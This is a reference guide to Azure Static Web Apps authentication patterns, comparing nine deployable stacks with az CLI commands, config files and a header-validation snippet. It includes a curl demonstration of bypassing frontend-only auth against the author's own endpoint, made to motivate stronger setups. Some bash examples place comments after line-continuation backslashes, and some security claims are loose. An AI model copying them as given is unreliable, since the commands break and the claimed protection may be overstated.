# Azure Static Web Apps Authentication Architectures

**Purpose:** Comprehensive reference guide for Azure Static Web Apps authentication patterns, covering both Managed Functions and Bring Your Own (BYO) Functions approaches.

**Author:** Built from hands-on implementation experience - the documentation we wish existed.

**Scope:** 9 deployable stack architectures demonstrating different authentication, networking, and data sovereignty patterns.

---

## Table of Contents

1. [Understanding SWA Functions](#understanding-swa-functions)
1. [Quick Decision Tree](#quick-decision-tree)
1. [Stack Architectures Overview](#stack-architectures-overview)
1. [Detailed Stack Implementations](#detailed-stack-implementations)
1. [Comparison Tables](#comparison-tables)
1. [Implementation Guide](#implementation-guide)
1. [Testing and Verification](#testing-and-verification)
1. [Real-World Scenarios](#real-world-scenarios)
1. [Troubleshooting](#troubleshooting)
1. [Cost Analysis](#cost-analysis)
1. [Key Learnings](#key-learnings)

---

## Understanding SWA Functions

### Two Approaches: Managed vs Bring Your Own

Azure Static Web Apps supports two distinct approaches for backend APIs:

#### 1. Managed Functions (SWA Manages Deployment)

**How it works:**

- SWA deploys your function code to its managed infrastructure
- You provide function code, SWA handles deployment, scaling, runtime
- Integrated in SWA deployment process (GitHub Actions or SWA CLI)
- No separate function app resource visible in Azure Portal

**Configuration:**

```bash
# SWA CLI deployment with managed functions
swa deploy \
 --app-location dist \
 --api-location api \ # Path to your API code (NOT empty)
 --deployment-token "${TOKEN}"
```

**Characteristics:**

- Region locked to 5 SWA regions: westus2, centralus, eastus2, westeurope, eastasia
- Consumption plan only (no Premium, no Dedicated)
- Free tier included in SWA pricing
- Automatic deployment and scaling
- Limited networking options (no VNet, no private endpoints)
- No separate function app management

**Best for:**

- Simple APIs with no specific region requirements
- EU data sovereignty (westeurope acceptable)
- Teams preferring automated deployment
- Prototypes and demos
- When simplicity > control

#### 2. Bring Your Own Functions (You Manage Deployment)

**How it works:**

- You deploy function app separately to ANY Azure region
- Link function app to SWA, or call directly from frontend
- You control deployment, scaling, networking
- Separate function app resource in Azure Portal

**Configuration:**

```bash
# Deploy function app separately
az functionapp create --location uksouth ...

# SWA CLI deployment WITHOUT managed functions
swa deploy \
 --app-location dist \
 --api-location "" \ # Empty = no managed functions
 --deployment-token "${TOKEN}"

# Optionally link function app to SWA
az staticwebapp backends link \
 --name swa-name \
 --backend-resource-id /subscriptions/.../function-app
```

**Characteristics:**

- Any Azure region (60+ regions globally)
- Any function plan (Consumption, Premium, Dedicated)
- Full networking support (VNet, private endpoints, NSGs)
- Separate function app management and logging
- You control deployment process
- Can link multiple SWAs to one function app

**Best for:**

- Specific region requirements (UK: uksouth, Australia: australiaeast)
- Data sovereignty compliance
- Advanced networking (VNet integration, private endpoints)
- Premium features (always-on, higher limits)
- Existing function apps
- When control > simplicity

### Key Differences

| Feature | Managed Functions | Bring Your Own Functions |
| --------------------- | ---------------------- | --------------------------------- |
| **Available regions** | 5 regions only | All Azure regions (60+) |
| **Data sovereignty** | Limited to 5 regions | Your choice |
| **Deployment** | SWA CLI/GitHub Actions | Your scripts (az CLI, Terraform) |
| **Function plan** | Consumption only | Consumption, Premium, Dedicated |
| **Cost** | Included in SWA | Separate function app billing |
| **VNet integration** | No | Yes (Premium/Dedicated) |
| **Private endpoints** | No | Yes (Premium/Dedicated) |
| **Control** | SWA manages | You manage |
| **Setup complexity** | Low (automatic) | Medium (manual deployment) |
| **Portal visibility** | Embedded in SWA | Separate function app resource |
| **Scaling control** | Automatic | You configure |
| **Custom domains** | Via SWA | Can add on function app too |
| **Monitoring** | Limited (SWA logs) | Full (Application Insights, etc.) |

### Data Sovereignty Implications

**Managed Functions:**

- If your data must stay in UK specifically: Cannot use (westeurope is closest, but not UK)
- If your data can be in EU: Can use (westeurope is in EU)
- If your data must stay in US: Can use (eastus2, westus2, centralus)
- If your data must stay in Australia: Cannot use (no managed region)

**Bring Your Own Functions:**

- UK requirement: Deploy to uksouth
- Australia requirement: Deploy to australiaeast
- Canada requirement: Deploy to canadacentral
- Any specific region: Deploy to that region

**Example Scenario:**

```txt
Requirement: Healthcare application, data must stay in UK

Managed Functions:
- Closest region: westeurope (EU, not UK)
- Compliance: FAIL (data leaves UK)

Bring Your Own Functions:
- Deploy to: uksouth
- Compliance: PASS (data stays in UK)
```

---

## Quick Decision Tree

```txt
START: Do you need a specific region for data sovereignty?
├── NO → Consider managed functions (simpler)
│ ├── Need authentication?
│ │ └── YES → Stack 09 (Managed + Entra ID)
│ │ └── NO → Stack 04 (Managed, No Auth)
│ │
│ └── Are you sure about no sovereignty requirements?
│ └── Check with compliance team!
│
└── YES → Use Bring Your Own Functions
 ├── Which region do you need?
 │ ├── UK (uksouth) → Continue
 │ ├── Australia (australiaeast) → Continue
 │ ├── Canada (canadacentral) → Continue
 │ └── Any other region → Continue
 │
 ├── Need maximum security (VNet, private endpoints)?
 │ └── YES → Stack 07 (Fully Private) - ~$129/month
 │ └── NO → Continue
 │
 ├── Need defense-in-depth (IP restrictions, header validation)?
 │ └── YES → Stack 06 (Network Secured) - $9/month
 │ └── NO → Continue
 │
 ├── Need authentication?
 │ └── YES → Continue to auth options
 │ └── NO → Stack 03 (No Auth) - $9/month
 │
 └── Which authentication approach?
 ├── Entra ID (enterprise SSO)
 │ ├── Simple setup → Stack 05b (Linked Backend) ← RECOMMENDED
 │ ├── Maximum security → Stack 05c (Double Auth)
 │ └── Just frontend → Stack 05a (Frontend Only)
 │
 └── Custom JWT (username/password)
 └── Stack 08 (JWT Auth) - $9/month
```

**Quick Recommendation:**

- **Most common:** Stack 05b (SWA Entra ID + Linked Backend, BYO in your region)
- **EU-friendly:** Stack 09 (Managed Functions + Entra ID in westeurope)
- **Maximum security:** Stack 07 (Fully Private with VNet)
- **Simplest:** Stack 04 (Managed Functions, no auth)

---

## Stack Architectures Overview

### Stack 03: No Authentication (Baseline) - BYO

**Status:** Already deployed

- **SWA:** `swa-subnet-calc-noauth`
- **Functions:** BYO, direct call to function app URL
- **Auth:** None
- **Region:** Your choice (e.g., uksouth)
- **Cost:** $9/month
- **Purpose:** Baseline for comparison, public demo

### Stack 04: Managed Functions (westeurope) - Managed

#### NEW - Shows managed approach

- **SWA:** `swa-subnet-calc-managed`
- **Functions:** Managed by SWA in westeurope
- **Auth:** None
- **Region:** westeurope (managed)
- **Cost:** $9/month
- **Purpose:** Demonstrate managed functions, simplest deployment

### Stack 05a: SWA Entra ID (Frontend Only) - BYO

- **SWA:** `swa-subnet-calc-entraid-frontend`
- **Functions:** BYO in uksouth, public API
- **Auth:** Entra ID on SWA (frontend only)
- **Region:** Your choice (e.g., uksouth)
- **Cost:** $9/month
- **Purpose:** Protect frontend content, API remains public

### Stack 05b: SWA Entra ID + Linked Backend - BYO

#### RECOMMENDED - Best balance

- **SWA:** `swa-subnet-calc-entraid-linked`
- **Functions:** BYO in uksouth, linked to SWA
- **Auth:** Entra ID on SWA (protects frontend + API via proxy)
- **Region:** Your choice (e.g., uksouth)
- **Cost:** $9/month
- **Purpose:** Enterprise auth with SWA proxy, same-origin benefits

### Stack 05c: Double Authentication - BYO

- **SWA:** `swa-subnet-calc-entraid-double`
- **Functions:** BYO in uksouth with Entra ID
- **Auth:** Entra ID on BOTH SWA and function app
- **Region:** Your choice (e.g., uksouth)
- **Cost:** $9/month
- **Purpose:** Maximum security, independent auth on each resource

### Stack 06: Network-Secured Function App - BYO

- **SWA:** `swa-subnet-calc-network-secured`
- **Functions:** BYO in uksouth with IP restrictions + header validation
- **Auth:** Entra ID on SWA + network restrictions on function
- **Region:** Your choice (e.g., uksouth)
- **Cost:** $9/month
- **Purpose:** Defense-in-depth with network-level security

### Stack 07: Fully Private Architecture - BYO Premium

#### Maximum security and compliance

- **SWA:** `swa-subnet-calc-private`
- **Functions:** BYO Premium in uksouth VNet, private endpoint only
- **Auth:** Entra ID on SWA + network isolation
- **Region:** Your choice (e.g., uksouth)
- **Cost:** ~$129/month
- **Purpose:** Zero public endpoints, maximum compliance

### Stack 08: JWT Token Auth - BYO

- **SWA:** `swa-subnet-calc-jwt`
- **Functions:** BYO in uksouth with JWT auth
- **Auth:** Application-level JWT (username/password)
- **Region:** Your choice (e.g., uksouth)
- **Cost:** $9/month
- **Purpose:** Traditional auth pattern, compare with platform auth

### Stack 09: Managed Functions + Entra ID - Managed

#### Shows managed + auth combination

- **SWA:** `swa-subnet-calc-managed-auth`
- **Functions:** Managed by SWA in westeurope
- **Auth:** Entra ID on SWA
- **Region:** westeurope (managed)
- **Cost:** $9/month
- **Purpose:** Complete managed approach with enterprise auth

---

## Detailed Stack Implementations

### Stack 03: No Authentication (Baseline)

**Architecture:**

```txt
User → SWA (global CDN) → HTTPS → Function App (uksouth, public)
 └── No auth └── No auth
```

**Purpose:**

- Establish baseline for comparison
- Demonstrate completely public architecture
- Show how direct function app calls work

**What's Secured:**

- Nothing - completely public

**What's NOT Secured:**

- Frontend HTML/CSS/JS (anyone can access)
- Function app API (anyone can call)

**Browser Dev Tools:**

- URL: `https://func-subnet-calc-43825.azurewebsites.net/api/v1/health`
- Headers: No auth headers
- CORS: Yes (cross-origin request)
- Cookies: None

**Deployment:**

```bash
# Already deployed via stack-03-swa-typescript-noauth.sh
# Key characteristics:
# - Function app: Consumption plan, uksouth
# - SWA: Standard tier
# - Frontend: Calls function app URL directly
# - VITE_API_URL="https://func-*.azurewebsites.net"
```

**Testing:**

```bash
# Anyone can access frontend
open https://noauth.publiccloudexperiments.net

# Anyone can call API directly
curl https://func-subnet-calc-43825.azurewebsites.net/api/v1/health
# Returns: {"status": "healthy", ...}
```

**Use Cases:**

- Public documentation sites
- Demo applications
- Open-source calculators/tools
- Testing and development

---

### Stack 04: Managed Functions (NEW)

**Architecture:**

```txt
User → SWA (global CDN)
 └── /api/* → Managed Functions (westeurope, SWA-controlled)
 └── Your code runs here
```

**Purpose:**

- Demonstrate how managed functions work
- Show automatic deployment process
- Understand region limitations
- Compare simplicity vs control

**Data Sovereignty:**

- NOT UK compliant (westeurope, not uksouth)
- EU compliant (westeurope is in EU)

**What's Different from BYO:**

- No separate function app in Portal
- SWA deploys your function code automatically
- Region locked to westeurope (for EU)
- Can't see function app logs separately

**Configuration:**

**staticwebapp.config.json:**

```json
{
 "$schema": "https://json.schemastore.org/staticwebapp.config.json",
 "routes": [
 {
 "route": "/api/*",
 "allowedRoles": ["anonymous"]
 }
 ],
 "navigationFallback": {
 "rewrite": "/index.html",
 "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
 }
}
```

**Deployment:**

```bash
# Create SWA in westeurope (managed functions region)
az staticwebapp create \
 --name swa-subnet-calc-managed \
 --resource-group rg-subnet-calc \
 --location westeurope \
 --sku Standard

# Build frontend
cd frontend-typescript-vite
VITE_API_URL="" bun run build # Empty = use /api route

# Deploy with managed functions
DEPLOYMENT_TOKEN=$(az staticwebapp secrets list \
 --name swa-subnet-calc-managed \
 --resource-group rg-subnet-calc \
 --query properties.apiKey -o tsv)

# CRITICAL: api-location is NOT empty (path to your API code)
bun x @azure/static-web-apps-cli deploy \
 --app-location dist \
 --api-location ../api-fastapi-azure-function \
 --deployment-token "${DEPLOYMENT_TOKEN}" \
 --env production

# SWA will:
# 1. Build frontend (already done)
# 2. Package your API code
# 3. Deploy API to managed functions in westeurope
# 4. Configure /api route automatically
```

**GitHub Actions Example:**

```yaml
name: Azure Static Web Apps CI/CD (Managed Functions)

on:
 push:
 branches:
 - main

jobs:
 build_and_deploy:
 runs-on: ubuntu-latest
 steps:
 - uses: actions/checkout@v3

 - name: Build And Deploy
 uses: Azure/static-web-apps-deploy@v1
 with:
 azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}
 repo_token: ${{ secrets.GITHUB_TOKEN }}
 action: "upload"
 app_location: "frontend-typescript-vite"
 api_location: "api-fastapi-azure-function" # Managed functions
 output_location: "dist"
```

**Browser Dev Tools:**

- URL: `/api/v1/health` (same domain, relative)
- Headers: No auth headers (anonymous access)
- CORS: No (same-origin)
- Cookies: None

**Verification:**

```bash
# Check SWA configuration
az staticwebapp show \
 --name swa-subnet-calc-managed \
 --resource-group rg-subnet-calc \
 --query "{name:name, location:location, sku:sku.name}" -o table

# Test API (via SWA)
curl https://swa-subnet-calc-managed.azurestaticapps.net/api/v1/health
# Returns: {"status": "healthy", "service": "subnet-calculator", ...}

# You will NOT find a separate function app in Portal
# Functions are embedded in SWA resource
```

**Key Observations:**

- Frontend calls `/api/v1/health` (relative URL, same domain)
- No CORS preflight (same-origin request)
- No separate function app visible in Portal
- API code runs in westeurope (managed by SWA)
- Automatic deployment (simpler workflow)
- Can't change region (westeurope for EU deployments)

**When to Use:**

- EU-based application (westeurope is acceptable)
- Simple API with no advanced networking needs
- Team prefers GitHub Actions automated deployment
- Don't need function app management/logging
- Prototype or demo project

**When NOT to Use:**

- UK data sovereignty required (need uksouth specifically)
- Need VNet integration
- Need private endpoints
- Need Premium function features
- Existing function app to integrate

---

### Stack 05a: SWA Entra ID (Frontend Only)

**Architecture:**

```txt
User → Entra ID Login
 ↓
 SWA (global CDN, Entra ID protected)
 └── Frontend calls → Function App (uksouth, public, no auth)
```

**Purpose:**

- Show Entra ID protecting frontend only
- Demonstrate that API can still be public
- Illustrate bypass vulnerability

**Data Sovereignty:**

- UK compliant (function app in uksouth)

**What's Secured:**

- Frontend HTML/CSS/JS (Entra ID login required)

**What's NOT Secured:**

- Function app API (anyone can call directly)

**Configuration:**

**staticwebapp.config.json:**

```json
{
 "$schema": "https://json.schemastore.org/staticwebapp.config.json",
 "routes": [
 {
 "route": "/*",
 "allowedRoles": ["authenticated"]
 }
 ],
 "responseOverrides": {
 "401": {
 "statusCode": 302,
 "redirect": "/.auth/login/aad"
 }
 },
 "auth": {
 "identityProviders": {
 "azureActiveDirectory": {
 "registration": {
 "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
 "clientIdSettingName": "AZURE_CLIENT_ID",
 "clientSecretSettingName": "AZURE_CLIENT_SECRET"
 }
 }
 }
 },
 "globalHeaders": {
 "cache-control": "no-cache, no-store, must-revalidate"
 }
}
```

**Deployment:**

```bash
# Prerequisites
export AZURE_CLIENT_ID="your-app-id"
export AZURE_CLIENT_SECRET="your-secret"

# Run stack deployment
./stack-05a-swa-typescript-entraid-frontend.sh

# Key steps:
# 1. Create SWA (Standard tier)
# 2. Create/reuse function app in uksouth (public, no auth)
# 3. Configure Entra ID on SWA
# 4. Deploy frontend (calls function app URL directly)
```

**Browser Dev Tools:**

- URL: `https://func-subnet-calc-*.azurewebsites.net/api/v1/health`
- Headers: None (no auth sent to function app)
- CORS: Yes (cross-origin request)
- Cookies: SWA auth cookie (but not sent to function app domain)

**Testing:**

```bash
# Frontend requires login
open https://entraid-frontend.publiccloudexperiments.net
# Redirects to Entra ID login

# After login, frontend works
# But API is still public:
curl https://func-subnet-calc-*.azurewebsites.net/api/v1/health
# Returns: {"status": "healthy", ...}
# NO AUTH REQUIRED - anyone can bypass!
```

**Security Vulnerability:**

```bash
# Attack scenario:
# 1. User inspects browser dev tools
# 2. Finds function app URL: https://func-subnet-calc-*.azurewebsites.net
# 3. Calls API directly from curl/Postman
# 4. Bypasses SWA Entra ID completely

# Example bypass:
curl -X POST https://func-subnet-calc-*.azurewebsites.net/api/v1/ipv4/subnet-info \
 -H "Content-Type: application/json" \
 -d '{"network":"10.0.0.0/24","mode":"simple"}'
# Returns: Full subnet calculation data
# NO AUTHENTICATION REQUIRED
```

**When to Use:**

- Want to protect frontend content/UI
- API data is not sensitive (can be public)
- Example: Documentation site with restricted access, but API examples are public

**When NOT to Use:**

- API contains sensitive data
- Need to protect backend access
- Use Stack 05b (linked backend) or 05c (double auth) instead

---

### Stack 05b: SWA Entra ID + Linked Backend (RECOMMENDED)

**Architecture:**

```txt
User → Entra ID Login
 ↓
 SWA (global CDN, Entra ID protected)
 └── /api/* → SWA Proxy → Function App (uksouth, public but proxied)
```

**Purpose:**

- Enterprise authentication with SWA platform
- SWA proxies API calls (same-origin benefits)
- Simplest secure setup for most use cases

**Data Sovereignty:**

- UK compliant (function app in uksouth)

**What's Secured:**

- Frontend HTML/CSS/JS (Entra ID login required)
- API access via SWA `/api/*` route (Entra ID required)

**What's NOT Secured:**

- Direct function app URL (if someone knows it, they can bypass)

**Configuration:**

**staticwebapp.config.json:**

```json
{
 "$schema": "https://json.schemastore.org/staticwebapp.config.json",
 "routes": [
 {
 "route": "/*",
 "allowedRoles": ["authenticated"]
 }
 ],
 "navigationFallback": {
 "rewrite": "/index.html",
 "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
 },
 "responseOverrides": {
 "401": {
 "statusCode": 302,
 "redirect": "/.auth/login/aad"
 }
 },
 "auth": {
 "identityProviders": {
 "azureActiveDirectory": {
 "registration": {
 "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
 "clientIdSettingName": "AZURE_CLIENT_ID",
 "clientSecretSettingName": "AZURE_CLIENT_SECRET"
 }
 }
 }
 },
 "globalHeaders": {
 "cache-control": "no-cache, no-store, must-revalidate"
 }
}
```

**Deployment:**

```bash
# Prerequisites
export AZURE_CLIENT_ID="your-app-id"
export AZURE_CLIENT_SECRET="your-secret"
export LOCATION=uksouth

# Run stack deployment
./stack-05b-swa-typescript-entraid-linked.sh

# Key steps:
# 1. Create function app in uksouth
# 2. Deploy function code (no auth needed - SWA handles it)
# 3. Create SWA (Standard tier)
# 4. Link function app to SWA
# 5. Configure Entra ID on SWA
# 6. Deploy frontend (calls /api route, not function URL)
```

**Linking Function App to SWA:**

```bash
# Via Azure CLI
az staticwebapp backends link \
 --name swa-subnet-calc-entraid-linked \
 --resource-group rg-subnet-calc \
 --backend-resource-id $(az functionapp show \
 --name func-subnet-calc-linked \
 --resource-group rg-subnet-calc \
 --query id -o tsv) \
 --backend-region uksouth

# Or via Azure Portal:
# 1. Navigate to SWA → Settings → APIs
# 2. Click "Link" in Production row
# 3. Select Function App
# 4. Choose your function app
# 5. Click "Link"
```

**Frontend Configuration:**

```typescript
// config.ts
export const API_CONFIG = {
 baseUrl: '', // Empty = use relative /api route (SWA proxy)
 // ...
}

// Build command
VITE_API_URL="" bun run build
```

**Browser Dev Tools:**

- URL: `/api/v1/health` (relative, same domain)
- Headers: Cookie (HttpOnly, set by SWA)
- CORS: No (same-origin request)
- Cookies: `.AspNetCore.Cookies` (SWA auth cookie)

**Testing:**

```bash
# Frontend requires login
open https://entraid-linked.publiccloudexperiments.net
# Redirects to Entra ID login

# After login, check browser dev tools:
# Network tab → See calls to /api/v1/health (same domain)
# No CORS preflight
# Cookie automatically sent

# Try to bypass (call function app directly)
curl https://func-subnet-calc-linked.azurewebsites.net/api/v1/health
# Returns: {"status": "healthy", ...}
# STILL WORKS - but most users won't know the URL

# Call via SWA without auth
curl https://entraid-linked.publiccloudexperiments.net/api/v1/health
# Returns: 302 Redirect to login
# BLOCKED - auth required
```

**Security Assessment:**

- Frontend protected (Entra ID)
- API via SWA protected (Entra ID)
- Direct function URL still public (obscurity, not security)
- **Mitigation:** Combine with Stack 06 (IP restrictions) for defense-in-depth

**Why Recommended:**

- Simplest secure setup
- Same-origin benefits (no CORS issues)
- HttpOnly cookies (XSS protection)
- Automatic CSRF protection
- Enterprise SSO (Entra ID)
- Reasonable security for most apps
- $9/month (cost-effective)

**When to Use:**

- Enterprise applications
- Internal tools
- Customer portals
- Most production scenarios

**When NOT to Use:**

- Need guarantee that API cannot be bypassed → Use Stack 05c or 06
- Maximum security required → Use Stack 07

---

### Stack 05c: Double Authentication

**Architecture:**

```txt
User → Entra ID Login (SWA)
 ↓
 SWA (Entra ID protected)
 └── Calls → Function App (Entra ID protected)
 └── Both have independent auth
```

**Purpose:**

- Maximum security with independent authentication
- Both SWA and function app verify identity
- No bypass possible (both endpoints protected)

**Data Sovereignty:**

- UK compliant (function app in uksouth)

**What's Secured:**

- Frontend (SWA Entra ID)
- API via SWA (SWA Entra ID)
- API direct access (Function App Entra ID)

**Configuration:**

**SWA staticwebapp.config.json:**

```json
{
 "$schema": "https://json.schemastore.org/staticwebapp.config.json",
 "routes": [
 {
 "route": "/*",
 "allowedRoles": ["authenticated"]
 }
 ],
 "responseOverrides": {
 "401": {
 "statusCode": 302,
 "redirect": "/.auth/login/aad"
 }
 },
 "auth": {
 "identityProviders": {
 "azureActiveDirectory": {
 "registration": {
 "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
 "clientIdSettingName": "AZURE_CLIENT_ID",
 "clientSecretSettingName": "AZURE_CLIENT_SECRET"
 }
 }
 }
 }
}
```

**Function App Authentication:**

```bash
# Enable Entra ID on function app
az functionapp auth update \
 --name func-subnet-calc-double \
 --resource-group rg-subnet-calc \
 --enabled true \
 --action LoginWithAzureActiveDirectory \
 --aad-client-id "${AZURE_CLIENT_ID}" \
 --aad-client-secret "${AZURE_CLIENT_SECRET}" \
 --aad-token-issuer-url "https://login.microsoftonline.com/${TENANT_ID}/v2.0"
```

**Deployment:**

```bash
# Prerequisites
export AZURE_CLIENT_ID="your-app-id"
export AZURE_CLIENT_SECRET="your-secret"
export TENANT_ID="your-tenant-id"
export LOCATION=uksouth

# Run stack deployment
./stack-05c-swa-typescript-entraid-double.sh

# Key steps:
# 1. Create function app in uksouth
# 2. Enable Entra ID on function app
# 3. Deploy function code
# 4. Create SWA (Standard tier)
# 5. Configure Entra ID on SWA
# 6. Deploy frontend
```

**Browser Dev Tools:**

- URL: `https://func-subnet-calc-double.azurewebsites.net/api/v1/health`
- Headers: Cookie from SWA + potentially Bearer token for function
- CORS: Yes (cross-origin)
- May see auth challenges from function app

**Complexity:**

- Frontend gets SWA auth cookie
- Function app expects its own Entra ID token
- Token mismatch can cause issues
- May need token exchange or client-side logic

**Testing:**

```bash
# Frontend requires SWA login
open https://entraid-double.publiccloudexperiments.net
# Redirects to Entra ID login (SWA)

# Try to bypass (call function app directly)
curl https://func-subnet-calc-double.azurewebsites.net/api/v1/health
# Returns: 401 Unauthorized
# BLOCKED - function app requires auth too!

# Even with SWA cookie, function app may reject
# (SWA cookie != Function App token)
```

**Challenges:**

- Two separate auth flows
- Token mismatch issues
- Complex troubleshooting
- May need custom code to handle

**When to Use:**

- Maximum security absolutely required
- Backend must be independently protected
- Multiple frontends access same backend
- Compliance requires defense-in-depth

**When NOT to Use:**

- Most scenarios (Stack 05b is simpler)
- Unless you specifically need independent backend auth

---

### Stack 06: Network-Secured Function App

**Architecture:**

```txt
User → Entra ID Login
 ↓
 SWA (Entra ID protected)
 └── Calls → Function App (uksouth)
 ├── IP restricted to Azure SWA ranges
 └── Header validation (must come from SWA)
```

**Purpose:**

- Defense-in-depth with network-level security
- IP restrictions prevent direct access
- Header validation ensures traffic originated from SWA
- Combines platform auth with network security

**Data Sovereignty:**

- UK compliant (function app in uksouth)

**What's Secured:**

- Frontend (Entra ID)
- API via SWA (Entra ID + network path)
- Direct API access (blocked by IP restrictions)

**Configuration:**

**Function App IP Restrictions:**

```bash
# Get Azure SWA service tag IP ranges
# Service Tag: AzureStaticWebApps

# Add IP restrictions to function app
az functionapp config access-restriction add \
 --name func-subnet-calc-network \
 --resource-group rg-subnet-calc \
 --rule-name "Allow-Azure-SWA" \
 --action Allow \
 --service-tag AzureStaticWebApps \
 --priority 100

# Block all other traffic (default deny)
az functionapp config access-restriction add \
 --name func-subnet-calc-network \
 --resource-group rg-subnet-calc \
 --rule-name "Deny-All" \
 --action Deny \
 --ip-address "0.0.0.0/0" \
 --priority 200
```

**Header Validation (Function App Code):**

```python
# In function app middleware
from azure.functions import HttpRequest, HttpResponse

ALLOWED_ORIGINS = [
 "entraid-network.publiccloudexperiments.net",
 "swa-subnet-calc-network.azurestaticapps.net"
]

def validate_origin(req: HttpRequest) -> bool:
 # Check X-Forwarded-Host header (set by SWA)
 forwarded_host = req.headers.get("X-Forwarded-Host", "")
 return forwarded_host in ALLOWED_ORIGINS

# In function handler
if not validate_origin(req):
 return HttpResponse(
 "Forbidden: Invalid origin",
 status_code=403
 )
```

**Deployment:**

```bash
# Prerequisites
export AZURE_CLIENT_ID="your-app-id"
export AZURE_CLIENT_SECRET="your-secret"
export LOCATION=uksouth

# Run stack deployment
./stack-06-swa-typescript-network-secured.sh

# Key steps:
# 1. Create function app in uksouth
# 2. Configure IP restrictions (Azure SWA service tag)
# 3. Deploy function code with header validation
# 4. Create SWA (Standard tier)
# 5. Link function app to SWA (or call directly)
# 6. Configure Entra ID on SWA
# 7. Deploy frontend
```

**Browser Dev Tools:**

- URL: `https://func-subnet-calc-network.azurewebsites.net/api/v1/health`
- Headers: Cookie from SWA
- CORS: Yes (cross-origin)
- Works from browser (traffic goes through SWA)

**Testing:**

```bash
# Frontend works normally
open https://entraid-network.publiccloudexperiments.net
# Login, app functions normally

# Try to bypass from local machine
curl https://func-subnet-calc-network.azurewebsites.net/api/v1/health
# Returns: 403 Forbidden (IP not in allowed ranges)

# Try to bypass from Azure VM in SWA IP range
# (Advanced attack scenario)
curl https://func-subnet-calc-network.azurewebsites.net/api/v1/health
# Returns: 403 Forbidden (header validation fails)
```

**Security Layers:**

1. **Entra ID (SWA):** User must authenticate
1. **IP Restrictions:** Only traffic from Azure SWA IP ranges allowed
1. **Header Validation:** Must come from correct SWA custom domain
1. **Result:** Very difficult to bypass

**Limitations:**

- Advanced attacker with VM in Azure SWA IP range could potentially spoof headers
- Not 100% bulletproof (that's Stack 07)
- But very good defense-in-depth for $9/month

**When to Use:**

- Want additional security beyond just authentication
- Can't afford Stack 07 (~$129/month)
- Defense-in-depth security strategy
- Compliance requires multiple security layers

**When NOT to Use:**

- Maximum security required → Use Stack 07 (VNet)
- Simple app → Stack 05b is sufficient

---

### Stack 07: Fully Private Architecture (MAXIMUM SECURITY)

**Architecture:**

```txt
User → Entra ID Login
 ↓
 SWA (Entra ID protected)
 └── /api/* → Private Link → VNet (uksouth)
 └── Function App (private endpoint ONLY)
 └── NO public internet access
```

**Purpose:**

- Maximum security and compliance
- Zero public endpoints for backend
- Data physically locked in VNet
- Complete network isolation

**Data Sovereignty:**

- MAXIMUM UK compliance (VNet in uksouth, private only)

**What's Secured:**

- Frontend (Entra ID)
- API (Private Link, no public access)
- Network isolation (VNet)
- No bypass possible (no public endpoint exists)

**Architecture Details:**

```txt
Internet
 ↓
Cloudflare (optional CDN)
 ↓
Azure SWA (global CDN + auth)
 ├── Static files (global)
 └── /api/* → Azure Private Link
 ↓
 VNet (10.0.0.0/16, uksouth)
 ├── snet-functions (10.0.1.0/24)
 │ └── Function App (VNet integrated)
 └── snet-private-endpoints (10.0.2.0/24)
 └── Private Endpoint (10.0.2.4)
 └── No public IP
 └── Data never leaves VNet
```

**Prerequisites:**

**VNet and Subnets:**

```bash
# Create VNet
az network vnet create \
 --name vnet-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --location uksouth \
 --address-prefix 10.0.0.0/16

# Create subnet for functions
az network vnet subnet create \
 --name snet-functions \
 --resource-group rg-subnet-calc \
 --vnet-name vnet-subnet-calc-private \
 --address-prefix 10.0.1.0/24

# Create subnet for private endpoints
az network vnet subnet create \
 --name snet-private-endpoints \
 --resource-group rg-subnet-calc \
 --vnet-name vnet-subnet-calc-private \
 --address-prefix 10.0.2.0/24 \
 --disable-private-endpoint-network-policies
```

**Premium Function App** (required for VNet):

```bash
# Create App Service Plan (Premium EP1)
az functionapp plan create \
 --name plan-subnet-calc-premium \
 --resource-group rg-subnet-calc \
 --location uksouth \
 --sku EP1 \
 --is-linux

# Create Function App
az functionapp create \
 --name func-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --plan plan-subnet-calc-premium \
 --storage-account stsubnetcalc123 \
 --runtime python \
 --runtime-version 3.11 \
 --functions-version 4
```

**VNet Integration:**

```bash
# Connect function app to VNet
az functionapp vnet-integration add \
 --name func-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --vnet vnet-subnet-calc-private \
 --subnet snet-functions
```

**Private Endpoint:**

```bash
# Disable public network access on function app
az functionapp update \
 --name func-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --set publicNetworkAccess=Disabled

# Create private endpoint
az network private-endpoint create \
 --name pe-func-subnet-calc \
 --resource-group rg-subnet-calc \
 --location uksouth \
 --vnet-name vnet-subnet-calc-private \
 --subnet snet-private-endpoints \
 --private-connection-resource-id $(az functionapp show \
 --name func-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --query id -o tsv) \
 --group-id sites \
 --connection-name pe-func-connection

# Create Private DNS Zone
az network private-dns zone create \
 --name privatelink.azurewebsites.net \
 --resource-group rg-subnet-calc

# Link DNS zone to VNet
az network private-dns link vnet create \
 --name dns-link \
 --resource-group rg-subnet-calc \
 --zone-name privatelink.azurewebsites.net \
 --vnet-name vnet-subnet-calc-private \
 --registration-enabled false

# Create DNS record for private endpoint
az network private-endpoint dns-zone-group create \
 --name default \
 --resource-group rg-subnet-calc \
 --endpoint-name pe-func-subnet-calc \
 --private-dns-zone privatelink.azurewebsites.net \
 --zone-name privatelink.azurewebsites.net
```

**Link to SWA:**

```bash
# Create SWA
az staticwebapp create \
 --name swa-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --location westeurope \
 --sku Standard

# Link function app via private endpoint
az staticwebapp backends link \
 --name swa-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --backend-resource-id $(az functionapp show \
 --name func-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --query id -o tsv) \
 --backend-region uksouth

# Configure Entra ID
az staticwebapp appsettings set \
 --name swa-subnet-calc-private \
 --resource-group rg-subnet-calc \
 --setting-names \
 AZURE_CLIENT_ID="${AZURE_CLIENT_ID}" \
 AZURE_CLIENT_SECRET="${AZURE_CLIENT_SECRET}"

